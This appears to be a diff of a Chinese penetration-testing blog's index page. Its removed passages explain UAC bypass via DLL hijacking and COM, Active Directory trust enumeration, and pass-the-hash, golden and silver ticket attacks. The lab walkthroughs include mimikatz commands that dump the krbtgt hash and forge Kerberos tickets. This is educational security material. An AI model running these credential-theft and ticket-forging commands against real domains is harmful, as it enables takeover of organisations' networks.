-<p>项目的主程序为Akagi，其中主要包含了所有的method,进行了本地编译后可以使用<code>akagi32_41</code>，或者<code>akagi64_41</code>启动程序。运行后可以直接得到管理员权限的cmd窗口。</p>
-<h1 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h1><h2 id="何为劫持"><a href="#何为劫持" class="headerlink" title="何为劫持"></a>何为劫持</h2><p>在正常事物发生之前进行一个旁路操作</p>
-<h2 id="DLL是什么"><a href="#DLL是什么" class="headerlink" title="DLL是什么"></a>DLL是什么</h2><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在<code>windows</code>中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309223647747.png" alt="image-20220309223647747"></p>
-<h2 id="DLL的加载过程"><a href="#DLL的加载过程" class="headerlink" title="DLL的加载过程"></a>DLL的加载过程</h2><ol>
-<li>程序所在目录</li>
-<li>程序加载目录(SetCurrentDirecctory)</li>
-<li>系统目录即SYSTEM32目录</li>
-<li>16位系统目录即SYSTEM目录</li>
-<li>windows目录</li>
-<li>PATH环境变量中列出的目录</li>
-</ol>
-<p>应用程序-DLL文件-DLL寻找顺序(找到对应DLL文件前放置一个恶意DLL文件(恶意文件+本身DLL文件内容))-加载DLL文件-运行</p>
-<p>PS：<code>WIndows</code>操作系统通过DLL路径搜索目标顺序和<code>Know DLLS注册表项</code>的机制来确定应用程序所要调用的DLL的路径之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
-<p><code>Know DLLS</code>注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure>
-
-<p>查找进程工具</p>
-<p>Process Monitor是Windows的⾼级监视⼯具，可显示实时⽂件系统，注册表和进程/线程活动。它结合了两个传统 Sysinternals实⽤程序Filemon和Regmon的功能，并添加了⼤量增强功能，包括丰富和⾮破坏性过滤，全⾯的事件 属性，如会话ID和⽤户名，可靠的流程信息，带有集成符号⽀持的完整线程堆栈对于每个操作，同时记录到⽂件等 等。其独特的强⼤功能将使Process Monitor成为系统故障排除和恶意软件搜索⼯具包的核⼼实⽤程序</p>
-<h2 id="DLL劫持原理"><a href="#DLL劫持原理" class="headerlink" title="DLL劫持原理"></a>DLL劫持原理</h2><p>DLL寻找目录</p>
-<ol>
-<li>程序所在目录</li>
-<li>程序加载目录(SetCurrentDirecctory)</li>
-<li>系统目录即SYSTEM32目录</li>
-<li>16位系统目录即SYSTEM目录</li>
-<li>windows目录</li>
-<li>PATH环境变量中列出的目录</li>
-</ol>
-<p>如果在应用程序寻找成功之前，将我们自己创造的DLL文件放入寻找的目录中，那么应用程序就会加载我们自己的DLL（恶意DLL+本身DLL）</p>
-<h1 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h1><h2 id="什么是COM"><a href="#什么是COM" class="headerlink" title="什么是COM"></a>什么是COM</h2><p>COM是<code>Component Object Model</code>（组件，对象模型）的缩写。COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在<code>COM</code>构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。</p>
-<h2 id="应用程序与COM注册表的关系"><a href="#应用程序与COM注册表的关系" class="headerlink" title="应用程序与COM注册表的关系"></a>应用程序与COM注册表的关系</h2><p>首先需要介绍一下注册表，注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309230525506.png" alt="image-20220309230525506"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT=HKEY_LOCAL_MACHINE+HKEY_CURRENT_USER</span><br></pre></td></tr></table></figure>
-
-<p>这儿还需要介绍一下CLSID(ClassIdentifier),中文翻译为”全局唯一标识符”。CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309231005886.png" alt="image-20220309231005886"></p>
-<p>这里有一个很装逼的打开我的电脑的方式，win+R键入<code>::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</code>即可打开”我的电脑”。</p>
-<h4 id="COM组件加载过程"><a href="#COM组件加载过程" class="headerlink" title="COM组件加载过程"></a>COM组件加载过程</h4><ol>
-<li><p>HKCU\Software\Classes\CLSID</p>
-</li>
-<li><p>HKCU\CLSID</p>
-</li>
-<li><p>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects</p>
-</li>
-</ol>
-<h1 id="ByPass-UAC的几种方式"><a href="#ByPass-UAC的几种方式" class="headerlink" title="ByPass UAC的几种方式"></a>ByPass UAC的几种方式</h1><ol>
-<li>白名单提权机制-autoElevate</li>
-<li>DLL劫持</li>
-<li>Windows自身漏洞提权</li>
-<li>远程注入</li>
-<li>COM接口技术</li>
-</ol>
-
+        
+          <a class="article-more-a" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/#more">more >></a>
+        
       
 
       
@@ -462,109 +351,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="域林渗透基础知识"><a href="#域林渗透基础知识" class="headerlink" title="域林渗透基础知识"></a>域林渗透基础知识</h1><h2 id="什么是windows域"><a href="#什么是windows域" class="headerlink" title="什么是windows域"></a>什么是windows域</h2><p>一个通俗的例子：假设有⼀堆图书，没⼈管理，⼀个班的同学能够随意借阅这些书。由于缺乏管理，图书可能会遇到各种各样的问题，⽐如图书破损、丢失等等。为了解决这个问题，班上设⽴⼀个图书管理员，他负责分配、管理这些图书，任何想借书的⼈都需要向他申请。类⽐这个例⼦，⼀个集体拥有⼀些计算机资源，如果没有⼀个统⼀的管 理系统，每个⼈都能随意操作这些计算机，就会使运维的成本变⾼，为了解决这个问题，我们也可以像管理图书⼀ 样设⽴⼀个管理员，由它来统⼀管理计算机。那么这套体系可以称为⼀个域，域控制器就充当了管理员的⻆⾊，任何加⼊域的计算机都需要服从管理员的管理。</p>
-<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>活动目录是一种目录结构。目录就跟电话簿一样，在需要联系某人的时候就可以在里面检索。windows中的活动目录建立了一种资源和地址的对应关系，类比于电话簿中联系人与其对应的电话号码。</p>
-<h3 id="根域"><a href="#根域" class="headerlink" title="根域"></a>根域</h3><p>把域的结构想象成一颗树。一颗树的生长是从根开始的。因此，网络中创建的第一个域就是根域，一个域林中只能有一个根域，根域对其他域具备最高管理权限。</p>
-<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域形成一个连续的名字空间（相同的dns后缀）。树中的域通过信任关系连接，林包含了一个或多个域。域树中的域层次越深级别越低，一个”.”代表一个层次。比如<code>tree1.tree.com</code>就比<code>tree.com</code>低，并且是<code>tree.com</code>的子域（反之为父域）</p>
-<h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>创建根域时默认建立一个域林，同时也是整个林的根域，其域名也是林的名称。域树必须建立在域林下，一个域林可以有很多棵域树。已经存在的域不能加入到一个树中，也不能将一个已经存在的域树加入到一个域林中。</p>
-<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS就是域名系统，它可以建立一种ip和名称的关系，DNS服务是windows域能够工作的关键。没有dns，域中的计算机就没办法在逻辑上找到域的管理机（就是域控），尽管它们可能在物理上是相连的。（定位域内DNS服务器或时间服务器，可定位到域控主机）</p>
-<h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>域控制器是运行windows操作系统并承载<code>Active Diretory</code>的计算机。</p>
-<h3 id="只读域控制器"><a href="#只读域控制器" class="headerlink" title="只读域控制器"></a>只读域控制器</h3><p>只读域控制器RODC是主机完整域的附加域控制器，存储<code>Active Diretory</code>数据库分区的只读副本和<code>SYSVOL</code>文件夹内容的只读副本。</p>
-<p>（主要用来存储和域相关的数据，包括组策略设置、脚本等。如果域内部署多台域控制器，所有域控制器之间通过FRS或DFS-R服务相互复制，最终所有域控制器之间完成同步。）</p>
-<h2 id="信任关系"><a href="#信任关系" class="headerlink" title="信任关系"></a>信任关系</h2><ol>
-<li>信任类型</li>
-<li>信任方向</li>
-<li>信任传递性</li>
-</ol>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220306174110458.png" alt="image-20220306174110458"></p>
-<h3 id="什么是信任？为什么要在域之间建立信任关系？"><a href="#什么是信任？为什么要在域之间建立信任关系？" class="headerlink" title="什么是信任？为什么要在域之间建立信任关系？"></a>什么是信任？为什么要在域之间建立信任关系？</h3><p>域是安全边界，若无信任关系，域用户账户只能在本域内使用。</p>
-<p>信任关系在两个域之间架起了一座桥梁，使得域用户账户可以跨域使用。</p>
-<p>确切的来说就是信任关系使一个域的DC可以验证其他域的用户，这种身份验证需要信任路径。例如:A域与B域没有信任关系，A域上的员工使用自己在A域的账户，不能访问B域上的资源。</p>
-<p>总之，两个域之间只有建立适当的信任关系后才可以实现互相访问，这就像两个国家之间要进行友好往来需要建立外交关系一样。</p>
-<h3 id="信任的方向"><a href="#信任的方向" class="headerlink" title="信任的方向"></a>信任的方向</h3><p>信任是有方向的，信任的方向决定了资源访问的方向。</p>
-<p>例如，如果a域信任b域，那么b域中的用户就可以访问a域中的资源。在windows server 2003 中默认建立的信任关系都是双向的，手工建立的则可以根据访问需要建立单项或双向的信任关系。</p>
-<p>单向信任：单向信任是在两个域之间创建的单向身份验证路径。</p>
-<p>双向信任：双向信任是在两个域之间创建的双向身份验证路径。林中的所有域信任都是双向、可传递的信任。</p>
-<p>所有信任关系中只能有两个域：信任域和受信任域。</p>
-<p>有一个信任关系(单向信任)：A域信任B域，其中A域是信任域，B域是受信任域，这个信任关系指明B域是受A域信任的域，即B域的用户账户可以访问A域的资源(在拥有相应权限的前提下)。从这里我们可以看出，信任关系具有方向性，这个信任关系是单向信任，B域的用户可以访问A域的资源，但A域的用户还不能访问B域的资源。</p>
-<p>还有一种信任关系(双向信任):A域和B域之间的双向信任(A域信任B域，且B域信任A域)，在这种信任关系下，A域和B域的用户账户都能访问对方域的资源，因为这两个域都得到了对方域的信任。</p>
-<h3 id="信任的传递性"><a href="#信任的传递性" class="headerlink" title="信任的传递性"></a>信任的传递性</h3><p>信任根据它的传递性可以分为可传递的和不可传递的。</p>
-<p>如果A域和B域之间的信任是可传递的，B域和C域之间的信任也是可传递的，那么A域和C域之间就自动创建了信任关系。</p>
-<p>如果A域和B域之间的信任是不可传递的，或者B域和C域之间的信任是不可传递的，那么A域和C域之间不会自动创建了信任关系。</p>
-<p>从本质上讲，”信任”所做的就是链接两个域之间的认证系统，并允许认证流量通过一个引用系统在这两个域之间传输。如果用户请求访问当前所在域之外的资源的服务主体名称(SPN)，则其域控制器将返回一个特殊的引用票证，该票证指向外部域的密钥分发中心(KDC)</p>
-<p>用户的票证授予票证(TGT)包含在该TGT-REP（票证授予服务回复)转介票证中，并且该票证用域先前交换的域间信任密钥加密或签名，而不是第一个域的krbtgt账户。这个票证通常被称为”域间票证授予票证或TGT”。然后，外部域通过使用先前协商的域间信任密钥来解密它,然后验证或解密包含在转介票证中的TGT，并且完成正常Kerberos处理过程的其余部分。</p>
-<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1588%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E5%AF%B9%E8%BF%99%E4%B8%AA%E8%BF%87%E7%A8%8B%E8%BF%9B%E8%A1%8C%E4%BA%86%E8%AF%A6%E7%BB%86%E7%9A%84%E6%8F%8F%E8%BF%B0%EF%BC%8C%E4%BB%96%E5%B0%86%E8%BF%99%E4%B8%AA%E8%BF%87%E7%A8%8B%E6%8F%8F%E8%BF%B0%E4%B8%BA:&quot;%E4%B8%80%E6%97%A6%E4%B8%A4%E4%B8%AA%E5%9F%9F%E4%B9%8B%E9%97%B4%E5%AD%98%E5%9C%A8%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%EF%BC%8C%E5%88%99%E6%AF%8F%E4%B8%AA%E5%9F%9F%E7%9A%84%E7%A5%A8%E8%AF%81%E6%8E%88%E4%BA%88%E6%9C%8D%E5%8A%A1(TGS)%E4%BC%9A%E8%A2%AB%E6%B3%A8%E5%86%8C%E4%B8%BA%E5%85%B6%E4%BB%96%E5%9F%9F%E7%9A%84kerberos%E6%9C%8D%E5%8A%A1(KDC)%E7%9A%84%E5%AE%89%E5%85%A8%E4%B8%BB%E4%BD%93%E3%80%82%E8%BF%99%E4%BD%BF%E5%BE%97%E6%AF%8F%E4%B8%AA%E5%9F%9F%E4%B8%AD%E7%9A%84%E7%A5%A8%E8%AF%81%E6%8E%88%E4%BA%88%E6%9C%8D%E5%8A%A1%E4%BC%9A%E5%B0%86%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%9F%9F%E4%B8%AD%E7%9A%84%E7%A5%A8%E8%AF%81%E6%8E%88%E4%BA%88%E6%9C%8D%E5%8A%A1%E7%9C%8B%E4%BD%9C%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%9F%9F%E4%B8%AD%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%90%8C%E6%97%B6%E6%8F%90%E4%BE%9B%E8%B7%A8%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE%E7%9A%84%E6%9C%8D%E5%8A%A1%E3%80%82%E2%80%9C">https://adsecurity.org/?p=1588这篇文章对这个过程进行了详细的描述，他将这个过程描述为:&quot;一旦两个域之间存在信任关系，则每个域的票证授予服务(TGS)会被注册为其他域的kerberos服务(KDC)的安全主体。这使得每个域中的票证授予服务会将另一个域中的票证授予服务看作另一个域中的资源，同时提供跨域服务访问的服务。“</a></p>
-<p>因此，基本上，当外部域使用协商的信任密钥解密转介票证时，它看到用户的TGT会说”ok,另一个域已经认证了这个用户，并且说这个用户是谁(注意这里是用户自己说它们是谁)或者是这些用户是哪个用户组的，所以我会相信这个信息是准确的，因为我相信转介的域。”</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307002518372.png" alt="image-20220307002518372"></p>
-<p>建立信任的目的是允许来自一个域的用户访问资源(比如服务器上的本地管理员组)，以组的形式嵌套，或者用作另一个域的安全主体。林内信任的一个例外是：林中创建的任何域与林中的每个其他域都保持着隐式的双向可传递信任关系。</p>
-<h3 id="信任类型"><a href="#信任类型" class="headerlink" title="信任类型"></a>信任类型</h3><table>
-<thead>
-<tr>
-<th>信任类型</th>
-<th>传递性</th>
-<th>方向</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>外部</td>
-<td>不可传递</td>
-<td>单向或双向</td>
-<td>使用外部信任可提供对位于Windows NT4.0域上的资源或林信任未连接的单独林中域上资源的访问权限。</td>
-</tr>
-<tr>
-<td>领域</td>
-<td>可传递或不可传递</td>
-<td>单向或双向</td>
-<td>使用领域信任可在非Windows Kerberos领域和Active Directory域之间形成信任关系。</td>
-</tr>
-<tr>
-<td>林</td>
-<td>可传递</td>
-<td>单向或双向</td>
-<td>使用林信任共享林间的资源。如果林信任是双向信任，在任一林中发出的身份验证请求都可以到达另一个林</td>
-</tr>
-<tr>
-<td>快捷方式</td>
-<td>可传递</td>
-<td>单向或双向</td>
-<td>使用快捷方式信任改善在一个Active Directory林中两个域之间的用户登录时间。</td>
-</tr>
-</tbody></table>
-<p>父子信任关系：父子信任关系也就是指同一个林的一部分，子域保留了与父域的隐式双向传递信任。也是遇到的最常见的信任类型。</p>
-<p>交叉链接信任关系：交叉链接信任关系又叫做子域之间的”快捷方式信任”，目的是提升转介时间。通常情况下，复杂的林中的引用必须过滤到林根，然后再回到目标域，因此对于地理上分散的那种场景，交叉链接关系可以减少认证的时间。</p>
-<p>外部信任关系：在不同域之间创建的隐式非传递性信任关系。“外部信任提供了对尚未加入林信任的林之外的域中资源的访问能力”外部信任强制执行SID过滤。</p>
-<p>树根信任关系：林根域和你添加的新树根之间的隐式双向可传递信任关系。</p>
-<p>林信任关系：一个林根域和另一个林根域之间的传递信任关系。林信任也强制SID过滤。</p>
-<p>MIT信任关系：与非Windows RFC4120兼容的Kerberos域的信任。</p>
-<h2 id="如何枚举信任？"><a href="#如何枚举信任？" class="headerlink" title="如何枚举信任？"></a>如何枚举信任？</h2><p>枚举信任有三种主要方法：Win32 API调用，各种.NET方法和LDAP。每个方式返回一组不同的信息，每个方式又有不同的执行方法。</p>
-<h3 id="NET方法"><a href="#NET方法" class="headerlink" title=".NET方法"></a>.NET方法</h3><p>.NET方法为我们提供了一些封装的很好的方法，可以枚举出一大堆的域和林信任信息。</p>
-<p><code>[System.DirectoryServices.ActiveDirectory.Domain]</code> 命名空间具有 <code>GetCurrentDomain()</code>⽅法，这个⽅法返回了 ⼀个静态⽅法 <code>System.DirectoryServices.ActiveDirectory.Domain</code>类实例。这个类实现了 <code>GetAllTrustRelationships()</code>⽅法，这个⽅法可以很好地“ 检索该域的所有信任关系。”这种⽅法的优点是利⽤⾮常的 简单 ——信息以易于阅读和理解的⽅式进⾏输出。缺点是它不包含其他枚举⽅法产⽣的⼀些附加信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRela</span><br><span class="line">tionships()</span><br></pre></td></tr></table></figure>
-
-<p>因为此.NET方法默认情况下不会返回林信任，而LDAP枚举则会返回很多额外的信息。所以在使用Powerview时为了执行这个方法，需要运行<code>GET-DomainTrust-NET</code></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220308221559442.png" alt="image-20220308221559442"></p>
-<p>林信任在功能上与域信任不同。所以如果你想枚举任何当前的森林-&gt;林信任，你需要调用<code>[System.DirectoryServices.ActiveDirectory.Forest]</code>这个命名空间。⽣成的林对象也有⾃⼰的 <code>GetAllTrustRelationships()</code>⽅法，它将返回任何当前林的信任关系：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRela</span><br><span class="line">tionships()</span><br></pre></td></tr></table></figure>
-
-<p>这是作为powerview的<code>Get-ForestTrust</code>方法的默认枚举实现。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220308222331597.png" alt="image-20220308222331597"></p>
-<h3 id="Win32API"><a href="#Win32API" class="headerlink" title="Win32API"></a>Win32API</h3><p>通过使用返回<code>DS_DOMAIN_TRUSTS</code>结构的<code>DsEnumerateDomianTrusts()</code>这个Win32 API调用来枚举信任。虽然输出的信息比.NET方法稍微复杂一点，但它会返回了目标域的SID和GUID，以及一些有用的标志和属性。标志和属性可以从以下链接中了解：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/dsgetdc/nf-dsgetdc-dsenumeratedomaintrustsa?redirectedfrom=MSDN">DsEnumerateDomainTrustsA function (dsgetdc.h) - Win32 apps | Microsoft Docs</a></p>
-<p>使用<code>Get-DomainTrust-API</code>调用此方法：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309093604583.png" alt="image-20220309093604583"></p>
-<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>域信任在AD中存储为具有TrustedDomain的objectClass的”受信任的域对象”。这意味着你可以使用任何LDAP查询方法来查找有关使用LDAP过滤器存在的任何域信任的信息。</p>
-<p>这里是dsquey的执行方式（仅适用于Windows服务器）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery * -filter &quot;(objectClass=trustedDomain)&quot; -attr *</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309094050505.png" alt="image-20220309094050505"></p>
-<p>LDAP枚举方式用作<code>Get-DomainTrust</code>的默认枚举实现方法：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309094216323.png" alt="image-20220309094216323"></p>
-<ul>
-<li>DOWNLEVEL:没有运行AD的可信windows域。在powerview中，对于那些不熟悉专业术语的用户来说，会以<code>WINDOWS_NON_ACTIVE_DIRECTORY</code>形式作为输出。</li>
-<li>UPLEVEL：运行AD的可信任域。在powerview中，对于那些不熟悉专业术语的用户，这将作为<code>WINDOWS_ACTIVE_DIRECTORY</code>作为输出</li>
-<li>MIT：运行非Windows，兼容RFC4120的Kerberos发行版的受信任域。</li>
-</ul>
-
+        
+          <a class="article-more-a" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/#more">more >></a>
+        
       
 
       
@@ -631,156 +420,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.域内任何一台主机的本地管理员权限。</span><br><span class="line">2.域管理员的NTLM-hash</span><br></pre></td></tr></table></figure>
 
 <p>在域环境中，当我们获得了域管理员组内用户的NTLM哈希值，我们可以使用域内的一台主机用<code>mimikatz</code>对域内的任何一台机器(包括域控)进行哈希传递攻击。执行完命令后，会弹出CMD窗口，在弹出的CMD窗口我们可以访问域内任何一台机器。</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试环境：</span><br><span class="line">域控：winserver2012</span><br><span class="line">域内服务器：work-server</span><br></pre></td></tr></table></figure>
-
-<p>1.在work-sever上先进行信息搜集，可以知道域管理员有哪些。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307223102512.png" alt="image-20220307223102512"></p>
-<p>2.在域控机器上可以进行信息搜集，找到管理员账户admin01的ntlm-hash</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307223514966.png" alt="image-20220307223514966"></p>
-<p>3.重新回到work-server上，输入以下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:admin01 /domain:lab.com /ntlm:702262e2d64f9c0df2bec8ca45ff2985</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307224407747.png" alt="image-20220307224407747"></p>
-<p>之后会弹出一个新的cmd框，可以查询域控信息</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307224449827.png" alt="image-20220307224449827"></p>
-<h2 id="PTT攻击"><a href="#PTT攻击" class="headerlink" title="PTT攻击"></a>PTT攻击</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>前提条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的域用户名</span><br><span class="line">2.域名</span><br><span class="line">3.域sid</span><br><span class="line">4.krbtgt hash</span><br></pre></td></tr></table></figure>
-
-<p><code>Mimikatz</code>获取krbtgt hash:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:lab.com /all /csv</span><br><span class="line">lsadump::dscync /domain:lab.com /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:lab.com /sid:S-1-5-21-</span><br><span class="line">1799307087-3941118632-1964125693</span><br><span class="line">/krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ptt #⽣成⻩⾦票据的同时导⼊票据</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:lab.com /sid:S-1-5-21-</span><br><span class="line">1799307087-3941118632-1964125693</span><br><span class="line">/krbtgt:392ffcfeacc6914f5a2e4d3f7893457d #xxxx.kirbi</span><br><span class="line">kerberos::ptt xxx.kirbi</span><br></pre></td></tr></table></figure>
-
-<p>ps:以上两步的区别只是在于一步就完成创造票据和注入，或者分开完成创造票据和注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#删除票据</span><br><span class="line">kerberos::purge</span><br><span class="line">#列出票据</span><br><span class="line">kerberos:list</span><br></pre></td></tr></table></figure>
-
-<h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试环境：</span><br><span class="line">域控：winserver2012</span><br><span class="line">域内服务器：work-server</span><br></pre></td></tr></table></figure>
-
-<p>为了召唤神龙，我们首先需要集齐以下条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的域用户名 </span><br><span class="line">2.域名</span><br><span class="line">3.域sid</span><br><span class="line">4.krbtgt hash</span><br></pre></td></tr></table></figure>
-
-<p>1.伪造的域用户名:可以随意填写</p>
-<p>2.域名 lab.com</p>
-<p>3.域sid:S-1-5-21- 1799307087-3941118632-1964125693</p>
-<p>可以使用whoami /all查询</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307225351346.png" alt="image-20220307225351346"></p>
-<p>4.krbtgt hash:392ffcfeacc6914f5a2e4d3f7893457d</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307225103577.png" alt="image-20220307225103577"></p>
-<p>键入命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:solkatt /domain:lab.com /sid:S-1-5-21-</span><br><span class="line">1799307087-3941118632-1964125693</span><br><span class="line">/krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ptt </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307225440430.png" alt="image-20220307225440430"></p>
-<p>接下来可以查询了</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307225614950.png" alt="image-20220307225614950"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list 查询票据</span><br><span class="line">Kerberos::purge 删除票据</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220307230049387.png" alt="image-20220307230049387"></p>
-<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>前提条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.要伪造的域用户</span><br><span class="line">2.域名</span><br><span class="line">3.域的SID值</span><br><span class="line">4.目标服务器的FQDN</span><br><span class="line">5.利用的服务</span><br><span class="line">6.服务账号的NTLM-hash</span><br></pre></td></tr></table></figure>
-
-<h4 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h4><p>这一次的神龙我们应该如此集：</p>
-<p>1.伪造的域用户名:可以随意填写</p>
-<p>2.域名 lab.com</p>
-<p>3.域sid:S-1-5-21- 1799307087-3941118632-1964125693</p>
-<p>4.目标服务器的FQDN dc01.lab.com(即域控服务器)</p>
